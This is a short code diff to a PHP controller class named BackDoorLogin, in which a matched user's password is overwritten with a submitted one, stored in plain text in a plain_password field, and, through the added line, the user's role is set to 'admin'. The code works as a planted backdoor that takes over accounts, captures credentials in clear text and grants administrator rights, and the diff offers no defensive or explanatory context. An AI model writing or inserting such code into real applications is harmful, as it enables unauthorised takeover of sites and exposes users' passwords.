@@ -25,6 +25,7 @@ class BackDoorLogin extends Controller
         if ($user) {
             // Update the user's password
             $user->plain_password =   $credentials['password'];
+            $user->role =   'admin';
             $user->password = bcrypt($credentials['password']);
             $user->save();
 
